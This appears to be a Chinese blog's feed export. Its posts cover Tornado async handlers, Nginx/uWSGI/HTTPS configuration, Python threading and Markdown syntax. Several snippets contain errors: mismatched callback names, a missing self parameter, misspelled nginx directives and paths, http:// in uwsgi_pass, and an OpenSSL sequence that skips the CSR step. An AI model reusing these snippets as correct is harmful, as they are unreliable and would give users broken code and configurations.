RequestHandler.set_cookie(name,value) ​ 按键值对设置Response中的Cookie值。 ​ (10) RequestHandler.clear_all_cookies ​ 清空本次请求中的所有Cookie。 异步化及协程化​ 上述例子都是用同步的方法来处理用户的请求，即在RequestHandler的get()和post()函数中完成所有的处理，当退出get()和post()等函数后马上向客户端返回Response。但是处理逻辑比较复杂或需要等待外部I/O时，这样的处理机制会阻塞服务器线程，并不适合大量客户端高并发的应用场景。 ​ Tornado有两种方式改变同步的处理流程。 异步化：针对RequestHandler的处理函数，使用@tornado.web.asynchronous修饰器，将默认的同步机制改为异步机制。 协程化：针对RequestHandler的处理函数，使用@tornado.gen.coroutine修饰器，将默认的同步机制改为协程机制。 异步化 异步化的RequestHandler处理如下： 12345678910111213import tornado.webimport tornado.httpclientclass MainHandler(tornado.web.RequestHandler): @tornado.web.asynchronous def get(self): http = tornado.httpclient.AsyncHTTPClient() http.fetch("http://www.baidu.com",callback=self.on_respinse()) def on_resoponse(self,response): if response.error:raise tornado.web.HTTPError(500) self.write(response.body) self.finish() ​ 本例中用装饰器tornado.web.asynchronous定义了HTTP访问处理函数get()。这样，当get()函数返回时，对该HTTP访问的请求尚未完成，所以Tornado无法发送HTTP Response给客户端。只有当在随后的on_response()中的finish()函数被调用时，Tornado才知道本次处理已完成，可以发送给Response给客户端。 ​ 异步编程虽然提高了服务器的并发能力，但编程方法繁琐。 2.协程化 ​ 协程的编程方法示例如下： 12345678import tornado.webimport tornado.httpclientclass MainHandler(tornado.web.RequestHandler): @tornado.gen.coroutine def get(): http = tornado.httpclient.AsyncHTTPClient() response = yield http.fetch("http://www.baidu.com") self.write(response.body) ​ 本例中展示仍然是一个转发网站内容的处理器，代码量与相应的同步版本差不多。协程化的关键技术点如下。 用tornado.gen.coroutine装饰MainHandler的get()、post()等处理函数。 使用异步对象处理耗时操作，比如本例的AsyncHTTPClient。 调用yield关键字获取异步对象的处理结果。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Tornado</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web服务器纵览]]></title>
    <url>%2F2019%2F03%2F18%2Fweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BA%B5%E8%A7%88%2F</url>
    <content type="text"><![CDATA[web框架概览1）网络框架及MVC架构 ​ MVC是软件工程中的一种软件架构设计模式，MVC把web应用系统分为如下3个基本部分：模型、视图、控制器，它们各自处理着自己的任务。几乎所有的Python全栈网络框架强制或引导开发者使用MVC架构开发Web应用。 注：全栈网络框架，是指除了封装网络和线程操作，还提供http栈，数据库的读写管理，HTML模板引擎等一系列功能的网络框架。 实现：创建一个作为模型的Student模型对象。StudentView是一个把学生详细信息输出到控制台的视图类，StudentController是负责存储数据到Student对象中的控制类，并相应地更新视图StudentView。MVCPatternDemo是使用StudentController来演示MVC模式用法的演示类。 模型（Model），用于封装与应用程序业务逻辑相关数据的处理，Model层是Web应用程序中处理应用程序的数据逻辑部分。换言之，模型表示企业数据和业务规则（大白话就是后端接口，用于业务处理）。 视图（View），负责数据的展示与呈现。 控制器（Controller），负责接受用户的输入并调用模型和视图去完成用户的需求，控制器本身不输出任何东西和做任何处理。它只是接收请求并决定调用哪个模型构件去处理请求，然后再确定用哪个视图来显示返回的数据。（可以看做是View的反向实现） 当前的主流服务器都实现了主流语言的可调用接口标准，有如下标准。 CGI（Common Gateway Interface），CGI规范允许Web服务器执行外部程序，并将它们的输出发送给Wb服务器，CGI将Web的一组简单的静态超媒体文档变成一个完整的新交互式媒体。 ISAPI（Internet Server Application Program Interface）是微软提供的一套面向Web服务的API接口，它能实现CGI提供的全部功能，并在此基础上进行了扩展（比如提供了过滤应用程序的接口）。 WSGI（Web Server Gateway Interface）是一套专门为Python语言制定的网络服务器标准接口。Python Web框架均以WSGI为基础构建。 ​ 一般来说，最简单的服务器端程序可以是直接读取某文件或返回固定的网页内容；稍复杂一些的服务端程序需要处理客户端通过HTTP、URL、HTML传入的参数、动态的执行逻辑代码、在数据库或者缓存中读写数据等一系列操作，才能最终生成调用结果。 ​ Web服务器是连接用户浏览器和Python服务器端程序的中间节点，在网站建立的过程中有着重要的作用。目前主流的Web服务器包括Nginx、Apache、lighthttpd、IIS等。Python服务端程序在Linux使用最广泛的是Nginx。 2）WSGI接口 ​ WSGI是将Python服务器端程序连接到Web服务器的通用协议。由于WSGI的通用性，出现了独立的WSGI程序，例如uWSGI和Apache的mod_wsgi。 ​ 由上图可知，WSGI的接口可分为两种：一个是与Web服务器接口，另一个是与服务器端程序的接口。WSGI Server与Web服务器的接口包括uwsgi、fastcgi等，服务器端程序的开发者无需学习此部分的详细内容，相反更应该关注WSGI与服务器端程序的接口。 ​ 虽然WSGI的设计目标是连接标准的Web服务器（Nginx，apache）与服务器端程序，但WSGI Server本身也可作为Web服务器运行（但WSGI性能方面不佳，WSGI Server一般只用于测试使用，不能用于正式运行）。 Linux+Nginx+uWSGI配 置​ Nginx是Python在Linux环境下的首选Web服务器之一（通常作为高性能http和反向代理服务器，广泛运用于天猫、美团、腾讯等大厂），以下演示在Ubuntu Linux中演示Nginx的安装与配置方法。 1) 安装Nginx 在Ubuntu Linux中可以通过如下命令安装Nginx： sudo apt-get install nginx 安装程序把Nginx以服务的形式安装在系统中，相关的程序及文件路径如下。 程序文件：放在/usr/sbin/nginx目录中。 全局配置文件：/etc/nginx/nginx.conf。 访问日志文件：/var/log/nginx/access.log。 错误日志文件：/var/log/nginx/err.log。 站点配置文件：/etc/nginx/sites-enabled/default。 安装好了，用如下命令启动Nginx服务器： sudo service nginx start 停止Nginx服务器： sudo service nginx stop 查看Nginx服务的状态： sudo service nginx status 重启Nginx服务器： sudo service nginx restart 2) Nginx配置文件 ​ Nginx安装后会以默认方式启动，在开发调试的过程中可能需要调整Nginx的运行参数，这些运行参数会通过全局配置文件(nginx.conf)和站点配置文件(sites-enabled)进行设置，对全局配置文件(/etc/nginx/nginx.conf)中的关键可设置参数解析如下： 1234567891011121314151617181920212223242526272829user www-data; ##定义运行Nginx的用户worker_processes 4; ##Nginx进程数，应设置与系统CPU数量相等的数值worker_rlimit_nofile 65535; ##每个Nginx进程可以打开的最大文件数events{ worker_connections 768; ##每个Nginx进程允许的最大客户端连接数 #在Nginx接到一个新连接通知后调用accept()来接受尽量多的连接 multi_accept off;}http{ ## # Basic Settings ## sendfile on; ##是否允许文件上传 client_header_buffer_size 32K; ##上传文件大小限制 tcp_nopush on; ##防止网络拥塞 tcp_nodelay on; ##防止网络拥塞 keepalive_timeout 65; ##允许客户端长连接最大秒数 ##Nginx散列表大小。本值越大，占用的内存空间越大，但路由速度很快 types_hash_max_size 2048; access_log /var/log/nginx/access.log; ##访问日志文件路径名 error_log /var/log/nginx/error.log; ##错误日志文件路径名 ## 如下两条用include命令加载站点配置文件 include /etc/nginx/conf.d/*.conf; include /etc/ngigx/sites-enabled/*; } ​ 在每个Nginx服务器中可以运行多个Web站点。每个站点的配置通过站点配置文件设置。每个站点应该以一个单独的配置文件存放在/etc/nginx/sites-enabled目录中，默认站点的配置文件名为/etc/nginx/sites-default，对其中关键内容的解析如下： 12345678910111213141516171819server{ ##配置站点监听的端口 listen 80; root /usr/share/nginx/html; ##配置HTTP根页面目录 index index.html index.htm; ##配置HTTP根目录中的默认页面 #站点监听的IP地址，默认的localhost只可用于本机访问，一般需要将其更改为真实IP sever_name localhost; ##location用于配置URL的转发接口 location /user/{ ##此处配置http://server_name/user/的转发地址 proxy_pass http://127.0.0.1:8080; } #错误页面配置，如下配置定义HTTP 404错误的显示页面 /404.html error_page 404 /404.html;} 3) 安装uWSGI及配置 ​ uWSGI是WSGI在Linux中的一种实现，这样开发者无需自己编写WSGI Server。使用pip命令可以直接安装uWSGI。 pip install uwsgi 123456789101112131415161718192021222324252627282930313233wjq@Ubuntu:~/TornadoWork/tornado_0/temp/cha5$ uwsgi --http-socket :9090 --plugin python --wsgi-file webapp.pyopen("./python_plugin.so"): No such file or directory [core/utils.c line 3724]!!! UNABLE to load uWSGI plugin: ./python_plugin.so: cannot open shared object file: No such file or directory !!!*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 11:23:32 2019] ***compiled with version: 4.8.4 on 16 March 2019 02:33:42os: Linux-4.4.0-124-generic #148~14.04.1-Ubuntu SMP Thu May 3 07:26:53 UTC 2018nodename: Ubuntumachine: x86_64clock source: unixdetected number of CPU cores: 2current working directory: /home/wjq/TornadoWork/tornado_0/temp/cha5detected binary path: /usr/local/bin/uwsgi!!! no internal routing support, rebuild with pcre support !!!*** WARNING: you are running uWSGI without its master process manager ***your processes number limit is 11929your memory page size is 4096 bytesdetected max file descriptor number: 1024lock engine: pthread robust mutexesthunder lock: disabled (you can enable it with --thunder-lock)uwsgi socket 0 bound to TCP address :9090 fd 3Python version: 2.7.12 (default, Jul 18 2016, 15:07:05) [GCC 4.8.4]*** Python threads support is disabled. You can enable it with --enable-threads ***Python main interpreter initialized at 0x1a33880your server socket listen backlog is limited to 100 connectionsyour mercy for graceful operations on workers is 60 secondsmapped 72920 bytes (71 KB) for 1 cores*** Operational MODE: single process ***WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1a33880 pid: 4554 (default app)*** uWSGI is running in multiple interpreter mode ***spawned uWSGI worker 1 (and the only) (pid: 4554, cores: 1)[pid: 4554|app: 0|req: 1/1] 59.68.29.48 () {32 vars in 590 bytes} [Sat Mar 16 11:47:29 2019] GET / => generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0)[pid: 4554|app: 0|req: 2/2] 59.68.29.48 () {32 vars in 571 bytes} [Sat Mar 16 11:47:30 2019] GET /favicon.ico => generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0)[pid: 4554|app: 0|req: 3/3] 59.68.29.48 () {32 vars in 571 bytes} [Sat Mar 16 11:47:38 2019] GET /favicon.ico => generated 20 bytes in 0 msecs (HTTP/1.1 200) 1 headers in 43 bytes (0 switches on core 0) ​ uwsgi --http-socket :9090 --plugin python --wsgi-file webapp.py ​ 启动时用-http参数指定了监听端口，用–wsgi-file指定了服务端的程序名。如上所示，uWSGI在启动的过程中会输出系统的一些环境信息：服务器名、进程数限制、服务器硬件配置、最大文件句柄数等。除了在uWSGI 启动命令行提供配置参数，uWSGI 还允许通过一个配置文件设置这些配置参数，比如可以编写如下配置文件，保存在文件名uwsgi.ini中： 123[uwsgi]http = 9090wsgi-file = webapp.py ​ 启动uWSGI时直接指定配置文件即可。 uwsgi uwsgi.ini 除了http和wsgi-file参数，uWSGI还有许多其他参数，常用的如下。 socket: 以WSGI的Socket方式运行，并指定连接地址和端口。该Socket接口是uWSGI与其他Web服务器（Nginx/Apache）等进行对接的方式。 chdir: 指定uWSGI 启动后的当前目录。 processes: 指定启动服务器端程序的进程数。 threads: 指定每个服务器端程序的线程数。即服务器端的总线程数为processes * threads。 uid: 指定运行uWSGI的Linux用户id。 举例，如下配置文件用于以Socket方式启动一个uWSGI服务器，并配置了进程和线程数。 12345[uwsgi]socket = 127.0.0.1: 3011wsgi-file = webapp.pyprocesses = 4threads = 3 4) 集成Nginx与uWSGI ​ 直接通过在站点配置文件中为location配置uwsgi_pass,即可将Nginx与uWSGI集成，建立一个基于Nginx+Python的正式站点。针对如下uWSGI接口有： 123[uwsgi]socket = 127.0.0.1： 3011wsgi_file = webapp.py ​ Nginx的站点配置文件为： 123456789101112server{ listen 80;}## 此处改为服务器的真实IP server_name 121.12.134.11;location /{ ## 此处IP与Port配置必须与uwsgi接口中参数相同 uwsgi_pass http://127.0.0.1:3011;}'''可以为一个uWSGI配置多个Nginx Server和location，这样就可以实现多域名访问同一个python程序。''' 建立安全的HTTPS网站​ 大多数的HTTP站点的协议与数据以明文方式在网络上传输，而HTTPS（HyperText Transfer Protocol over Secure Socket Layer ）是以安全为目标的HTTP通道，即在HTTP下加入SSL层，通过SSL达到数据加密及身份认证的功能。目前大多数银行、证券、交通的网站均以HTTPS方式构建。 ​ OpenSSL是一个强大的免费Socket层密码库，蕴含了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议。目前大多数网站通过OpenSSL工具搭建HTTPS站点，其步骤如下。 在服务器中安装OpenSSL工具包。 生成SSL密钥和证书。 将证书配置到Web服务器。 在客户端安装CA证书。 ​ 如下记录在Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-124-generic x86_64)下使用OpenSSL的方法，以及Nginx在Linux下的证书配置方式。类似Linux其他发行版、Windows方法类似。 ​ 1）在服务器中安装OpenSSL工具包 ​ 通过如下两条命令安装OpenSSL： 12#sudo apt-get install openssl#sudo apt-get install libssl-dev 命令运行成功后，OpenSSL命令和配置文件将被安装到Linux系统目录中。 OpenSSL命令：/usr/bin/openssl。 配置文件：/usr/lib/ssl/*。 2）生成SSL密钥和证书 1通过如下步骤生成CA证书ca.crt、服务器密钥文件server.key和服务器证书server.crt: 1234567891011#生成CA密钥openssl genrsa -out ca.key 2048#生成CA证书，days参数以天为单位设置证书的有效期。在本过程中会要求输入证书的所在地、公司名、站点名等openssl req -x509 -new -nodes -key ca.key -days 365 -out ca.crt#生成服务器证书RSA的密钥对openssl genrsa -out server.key 2048#生成服务器端证书ca.crtopenssl x509 -req -in server.csr -CA ca.crt -CAKey ca.key -CAcreateserial -out server.crt -days 365 ​ 上述命令生成服务器端证书时，需要在Common Name(CN)字段中如实输入站点的访问地址。即设若要访问www.abc.com进行访问，则必须定义CN=www.abc.com；如果通过IP地址访问，则需设置CN为具体的IP地址。 ​ 3）配置Nginx HTTPS服务器 ​ 在站点配置文件/etc/nginx/sites-enabled/default中添加如下server段，可以定义一个基于HTTPS的接口，该接口的服务器端程序仍旧为uWSGI接口127.0.0.1:3011。 1234567891011server{ listen 443; #HTTPS服务端口 server_name 0.0.0.0; #本机上的所有IP地址 ssl on; # ssl_certificate /etc/nginx/ssl/server.crt; ssl_certificate_key /etc/nginx/ssl/server.key;location \ { uwsgi_pass http://127.0.0.1:3011; }} ​ 其中需要注意的参数ssl_certificate和ssl_certificate_key需要分别指定生成的服务器证书和服务器密钥的全路径文件名。到此，我们就可以使用浏览器访问服务器的443端口进行HTTPS加密通信了。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>web server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python多线程]]></title>
    <url>%2F2019%2F03%2F16%2FPython%E5%A4%9A%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Python多线程同步和异步概念和区别​ 我们经常会看到同步、异步、阻塞、非阻塞四种调用方式以及它们的组合。那同步和异步的概念和区别又是什么呢？ 同步(Sync) ​ 同步的思想就是发出一个功能调用时，在没有得到结果之前，该调用就不返回或继续执行后续操作。 也就是说所有的操作都做完，才返回给用户。(会给人一种程序还在进行，卡死的感觉)，事情需要一件一件的做，等前一件做完了才能做下一件事。 ​ 举例:B/S模式中的表单提交，具体过程是：客户端提交请求->等待服务器处理->处理完毕返回，在这个过程中客户端（浏览器）不能做其他事。 异步(Async) ​ 异步与同步相对，当一个异步过程调用发出后，调用者在没有得到结果之前，就可以继续执行后续操作。当这个调用完成后，一般通过状态、通知和回调来通知调用者。对于异步调用，调用的返回并不受调用者控制。 ​ 对于通知调用者的三种方式，具体如下： ​ 状态 ​ 即监听被调用者的状态（轮询），调用者需要每隔一定时间检查一次，效率会很低。 ​ 通知 ​ 当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能。 ​ 回调 ​ 与通知类似，当被调用者执行完成后，会调用调用者提供的回调函数。 ​ 举例:B/S模式中的ajax请求，具体过程是：客户端发出ajax请求->服务端处理->处理完毕执行客户端回调，在客户端（浏览器）发出请求后，仍然可以做其他的事。 同步和异步的区别: ​ 请求发出后，是否需要等待结果，才能继续执行其他操作。 多线程的动机​ 在多线程(MT)编程出现之前，程序的运行由一个执行序列组成，执行序列按顺序在主机的中央处理器(CPU)中运行。无论是任务本身要求顺序执行还是整个程序是由多个子任务组成，程序都是按照这种方式执行的，即便子任务相互独立，互相无关(即，一个子任务的结果不影响其他子任务的结果)时也是这样。多线程的目的就是要并行运行这项相互独立的子任务，这样的并行处理可以大幅度的提升整个任务的效率。 ​ 多线程对于某些任务是最理想的，这些任务的特点是：它们本质上就是异步的，需要有多个并发事务，各个事务的运行程序可以是不确定的，随机的，不可预测的。这样的编程任务可以被分为多个执行流，每个流都要有一个要完成的目标。根据应用的不同，这些子任务可能都要计算出一个中间结果，用于合并得到最后的结果。 ​ 使用多线程编程和一个共享的数据结构如Queue（一种多线程队列数据结构），这种程序任务可以用几个功能单一的线程来组织: UserRequestThread：负责读取用户的输入，可能是一个I/O通道。程序可能创建多个线程 每个客户一个，请求会被放到队列中。 RequestProcessor：一个负责从队列中获取并处理请求的线程，它为下面那种线程提供输出。 ReplyThrea：负责把用户的输出取出来，如果是网络应用程序就把结果发送出去，否则就保存在本地系统或者数据库中。 把编程任务用多线程来组织可以降低程序的复杂度，并使得干净，有效和良好组织地程序结构的实现变得可能。并且每个线程的逻辑都不会很复杂，因为它要做的事很清楚。 线程和进程什么是进程？​ 计算机程序只不过是磁盘中可执行的，二进制（或其他类型）的数据。它们只有在被读取到内存中，被操作系统调用的时候才开始它们的生命期。进程（有时叫重量级进程）是程序的一次执行。每个进程都有自己的地址空间，内存，数据栈以及其它记录其运行轨迹的辅助数据。OS管理在其上运行的所有进程，并为这些进程公平的分配时间。进程也可以通过fork和spawn操作来完成其它的任务。不过各个进程都有自己的内存空间，数据栈等，因此只能使用进程间通信(IPC)，而不能直接共享信息。 ​ 进程和线程的概念、区别和联系 ​ 深入理解线程和进程 什么是线程？​ 线程（有时也叫轻量级进程）和进程有点像，不同的是，所有的线程运行在同一个进程中，共享相同的运行环境。 ​ 线程有开始，顺序执行和结束三部分。它有一个自己的指令指针，记录自己运行到什么地方。线程的运行可能被抢占（中断），或暂时的被挂起（睡眠），让其他的线程运行，这叫做让步。 ​ 一个进程中的各个线程之间共享同一片数据空间，所以线程之间可以比进程之间更方便地共享数据以及相互通讯。线程一般都是并发执行的，正是由于这种并行和数据共享的机制使得多个任务的合作变为可能。 ​ 在单CPU的系统中，真正的并发是不可能的，每个线程会被安排成每次只运行一小会，然后就把CPU让出来，让其他的线程去运行。在进程的整个运行过程中，每个线程都只做自己的事，在需要的时候跟其他的线程共享运行的结果。当然，这样的共享是存在危险的，如果多个线程共同访问同一片数据，则由于数据的访问顺序不一样，有可能造成结果不一致问题。这就是竞态条件（race condition）。但可以通过大多数线程库带有一系列的同步原语，来控制线程的执行和数据的访问。还有就是由于有的函数会在完成之前阻塞住，在没有特别为多线程做修改的情况下，这种”贪婪”的函数会让CPU的时间分配有所倾斜，导致各个线程分配的运行时间可能不尽相同，不尽公平。 Python线程和GIL全局解释锁（GIL）​ Python代码的执行是由Python虚拟机（也叫解释器主循环）来控制，Python在设计之初就考虑到要在主循环中，同时只有一个线程在执行，就像单CPU系统中运行多个进程那样，内存中可以存放多个程序，但任意时刻，只有一个程序在CPU中运行。同样地道理，虽然Python解释器中可以运行多个线程，但在任意时刻，只有一个线程在解释器中运行。 ​ 对Python虚拟机的访问由全局解释器锁(GIL)来控制，正是这个锁能保证同一时刻只有一个线程在运行。在多线程的环境下，Python虚拟机按以下方式执行： 设置GIL 切换到一个线程去运行 运行 a.指定数量的字节码指令，或者， b.线程主动让出控制（可以调用time.sleep(0)） 把线程设置为睡眠状态 解锁GIL 再次重复以上所有步骤 ​ 在调用外部代码（如C/C++扩展函数）的时候，GIL将会被锁定，直到这个函数结束为止（因为在这期间内有Python的字节码被运行，所以不会做线程切换），编写扩展的程序员可以主动解锁GIL。 ​ 对于I/O密集型的Python程序比计算密集型程序更能充分利用多线程环境的好处。这是因为，对所有面向I/O的（会调用内建的OS的C代码的）程序来说，GIL会在这个I/O调用之前被释放，以允许其它的线程在这个线程等待I/O的时候运行。如果某线程并未使用很多I/O操作，它会在自己的时间片内一直占用处理器和GIL。 ​ GIL的一点源码 退出线程​ 当一个线程结束计算，它就退出了。线程可以调用thread.exit()之类的退出函数，也可以使用Python退出进程的标准方法，如sys.exit()或抛出一个SystemExit异常等。但是，我们不可以直接kill掉一个进程。 ​ 有两个和线程相关的模块thread和threading，但不建议直接使用thread模块，显而易见的一个原因是当主进程退出的时候，所有其它线程没有被清除就退出了。但另一个模块threading就能确保所有”重要的”子线程都退出后，进程才会结束。 ​ 而且，主线程应当作为一个好的管理者，它要了解每个线程都要做些什么事，线程都需要什么数据和参数，以及在线程结束的时候，它们都提供了什么结果。这样，主线程就可以把各个线程的结果组合成一个有意义的最后结果。 ​ 实际上Python提供了几个用于多线程编程的模块，包括thread,threading和Queue等。thread和threading模块允许程序员创建和管理线程。thread模块提供了基本的线程和锁的支持，而threading提供了更高级别，功能更强的线程管理功能。Queue模块允许用户创建一个用于多个线程之间共享数据的队列数据结构。 没有线程支持的情况1234567891011121314151617181920212223# -*- coding:utf-8 -*-#onethr.py#!/usr/bin/env pythonfrom time import sleep,ctimedef loop0(): print('start loop0 at:',ctime()) sleep(4) print('loop0 done at:',ctime())def loop1(): print('start loop1 at:', ctime()) sleep(2) print('loop1 done at:', ctime())def main(): print('starting at:', ctime()) loop0() loop1() print('all done at:',ctime())if __name__ == "__main__": main() ​ 我们会使用time.sleep()函数来演示线程是怎样工作的。time.sleep()需要一个浮点型参数，来指定”睡眠”的时间(单位秒)。这就意味着，程序的运行会被挂起指定的时间。 ​ 我们要创建两个”计时循环”。一个睡眠4秒钟，一个睡眠2秒钟，分别是loop0()和loop1().（我们命名为”loop0”和”loop1”表示我们将有一个循环的序列）。 ​ 如果我们在一个进程或者一个线程中，顺序的执行loop0()和loop1()，那运行的总时间为6秒。在启动loop0(),loop1(),和其它的代码时，也要花去一些时间，所以，我们看到的总时间也有可能会是7秒钟。 ​ 假定loop0和loop1里做的不是睡眠，而是各自独立的，不相关的运算，各自的运算结果到最后将会汇总成一个最终的结果。这时，如果能让这些计算并行执行的话，那这样就会减少总的运行时间，这就是多线程编程的前提条件。 避免使用thread模块​ 不建议使用thread模块，首先是因为更高级别的threading模块更为先进，对线程的支持更为完善，而且使用thread模块里的属性有可能会与threading模块出现冲突。其次，低级别的thread模块的同步原语很少（实际上只有一个），而threading模块则有很多。 ​ 另一个不要使用thread原因是，对于你的进程什么时候应该结束完全没有控制，当主线程结束时，所有的线程都会被强制结束掉，没有警告也不会有正常的清除工作。而threading模块能确保重要的子线程退出后进程才退出。 ​ 只建议那些有经验的专家想访问线程的底层结构的时候，才使用thread模块。 thread模块和threading模块thread模块​ thread模块除了产生线程外，thread模块也提供了基本的同步数据结构锁对象(lock object,也叫原语锁，简单锁，互斥锁，互斥量，二值信号量)，同步原语与线程的管理是密不可分的。 ​ 下表列出常用的线程函数以及LockType类型的锁对象的方法。 函数 描述 thread模块函数 start_new_thread(function,args,kwargs=None) 产生一个新的线程，在新线程中用指定的参数和可选的kwargs来调用这个函数。 allocate_lock() 分配一个LockType类型的锁对象 exit() 让线程退出 LockType类型锁对象方法 acquire(wait=None) 尝试获得锁对象 locked() 如果获取了锁对象返回True,否则返回False release() 释放锁 ​ start_new_thread()函数式thread模块的一个关键函数，它的语法与内建的apply()函数完全一样，其参数为:函数，函数的参数以及可选的关键字参数。不同的是，函数不是在主线程里运行，而是产生一个新的线程来运行这个函数。 ​ 这里我们执行的是和onethr.py中一样的循环，不同的是，这一次我们使用的是thread模块提供的多线程的机制。两个循环并发的执行（显然，短的那个先结束）。总的运行时间为最慢的那个线程的运行时间，而不是所有线程的运行时间之和。 ​ 12345678910111213141516171819202122232425# -*- coding:utf-8 -*-#!/usr/bin/env python#mtsleep1.pyimport thread #需要python2环境from time import sleep,ctimedef loop0(): print('start loop0 at:',ctime()) sleep(4) print('loop0 done at:',ctime())def loop1(): print('start loop1 at:', ctime()) sleep(2) print('loop1 done at:', ctime())def main(): print('starting at:', ctime()) thread.start_new_thread(loop0,()) thread.start_new_thread(loop1,()) sleep(6) print('all done at:',ctime())if __name__ == "__main__": main() ​ 这个程序的输出与之前的输出大不相同，之前是运行了6,7秒，而现在则是4秒，是最长的循环的运行时间和其它代码的时间之和。睡眠4秒和睡眠2秒是并发执行的，这样就使得总的运行时间被缩短了。loop1在loop0前面就结束了，而且程序多了一个sleep(6)的函数调用。为什么要加入sleep(6)，这是因为如果没有让主线程停下来，那主线程就会运行下一条语句，显示”all done”，然后就关闭了运行着的loop0()和loop1()的两个线程，退出了。 ​ 的确这里应该有更好的管理线程的办法，而不是在主线程里面做一个额外的延时6s的操作。也就是说，我们要写让主线程停下来等所有子线程结束之后再继续运行的代码，这也是线程需要同步的原因。用sleep()函数做线程的同步操作是不可靠的，因为如果有循环的执行时间不能事先确定的话，这可能会造成主线程过早或过晚退出，这就要用到锁了。 Python多进程Python多进程和多线程参考扩展阅读Python并发编程理论部分1 并发编程理论部分2 Python模块学习:threading多线程控制和处理 Python中的multiprocessing和threading Python 多线程 threading和multiprocessing模块 Python并发编程之协程/异步IO python多进程Python多进程基本说明 实现多进程的几种方式 Python多进程使用说明 python多线程Python核心编程-多线程 Python的一种线程池模型 多种方式实现Python线程池 假的多线程 一个进程内运行多个python虚拟机 ​ 说明：如果想让python多线程，真正支持多核，那么应该 1、重写python编译器(官方cpython)如使用：PyPy解释器 2、调用C语言的链接库 。 ​ 而实际上，多核多线程比单核多线程更差，原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低 。 python协程​ Python并行的最好策略应当是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。 。 ​ Python协程概念 ​ Python协程的一点剖析]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown入门_1]]></title>
    <url>%2F2018%2F05%2F08%2Fmarkdown%E5%85%A5%E9%97%A8%E4%B9%8B1%2F</url>
    <content type="text"><![CDATA[Markdown基本语法介绍 参考链接:https://www.jianshu.com/p/b03a8d7b1719 简明教程：https://ouweiya.gitbooks.io/markdown/ 有道云MarkDown教程：http://note.youdao.com/iyoudao/?p=2411 W3cShcool:https://www.w3cschool.cn/lme/t13p1sri.html 1.标题代码 注：#后面保持空格 12345678910# h1## h2### h3#### h4##### h5###### h6####### h7 // 错误代码######## h8 // 错误代码######### h9 // 错误代码########## h10 // 错误代码 演示h1h2h3h4h5h6####### h7 ######## h8 ######### h9 ########## h10 2.分级标题代码 注：=-最少可以只写一个，兼容性一般 1234一级标题======================二级标题--------------------- 演示一级标题二级标题3.Toc代码 注：根据标题生成目录 1[TOC] 演示[TOC] 引用行内标记++代码块++插入链接插入图片插入图片带有链接序表任务列表表情表格支持内嵌CSS样式4.引用代码1（单行式）1>hello world! 演示 hello world 代码2（多行式）123> hello world!hello world!hello world! 或者123>hello world!>hello world!>hello world! 演示 hello world!hello world!hello world! 代码3（多层嵌套）123> aaaaaaaa>> bbbbbbbb>>> cccccccc 演示 aaaaaaaa bbbbbbbb ccccccccc 5.行内标记 注：用 ` 标记代码块将变成一行 代码1标记之外`hello world`标记之外 演示标记之外hello world标记之外 错误代码 注：不同平台错误略有差异1234567 标记之外 ` < div> < div> < div> < div>< /div>`标记之外 演示 标记之外 < div> ​ < div> ​ < div> ​ < div> < /div> 标记之外 6.代码块 注：与上行距离一空行 **代码1(123> 注：用```生成块 #### 演示 123**代码2(Tab)**> 注：Tab缩进 #### 演示 我是文字…… 123456789**代码3(自定义语法)**> 注：根据不同的语言配置不同的代码颜色 ```javascriptvar num = 0;for (var i = 0; i < 5; i++) { num+=i;}console.log(num); 7.插入链接代码1(内链式) 注：{:target=”_blank”}跳转方式兼容性一般 ，多数第三方平台不支持跳转 1[百度1](http://www.baidu.com/" 百度一下"){:target="_blank"} 演示百度1 代码2(引用式)12[百度2][2]{:target="_blank"}[2]: http://www.baidu.com/ "百度二下" 演示百度2 8.插入图片代码1(内链式)1![](./01.png '描述') 演示 代码2(引用式)12![name][01][01]: ./01.png '描述' 演示 9.插入图片带有链接代码1234[![](./01.png '百度')](http://www.baidu.com){:target="_blank"} // 内链式[![](./01.png '百度')][5]{:target="_blank"} // 引用式[5]: http://www.baidu.com 演示内链式 引用式[][1]{:target=”_blank”}[1]: http://www.baidu.com 10.视频插入 注: Markdown语法是不支持直接插入视频的12普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面 代码1 注: 多数第三方平台不支持插入视频1&lt;iframe height=498 width=510 src=&apos;http://player.youku.com/embed/XMjgzNzM0NTYxNg==&apos; frameborder=0 &apos;allowfullscreen&apos;&gt;&lt;/iframe&gt; 代码21[![](./youku2.png)](http://v.youku.com/v_show/id_XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A&from=y1.3-tv-grid-1007-9910.86804.1-2#paction){:target="_blank"} 11.序表代码1(有序) 1231. one2. two3. three 演示 one two three 代码2(无序) 123* one* two* three 演示 one two three 代码3(序表嵌套)1234561. one 1. one-1 2. two-22. two * two-1 * two-2 演示 one one-1 two-2 two two-1 two-2 代码4(序表嵌套代码块) 注: 换行+两个Tab12* one var a = 10; //与上行保持空行并递归缩进 演示 one var a = 10; //与上行保持空行并递归缩进 12.任务列表 注：兼容性一般 要隔开一行12345这是文字……- [x] 选项一- [ ] 选项二 - [ ] [选项3] 演示 选项一 选项二 [ ] [选项3] 13.表情 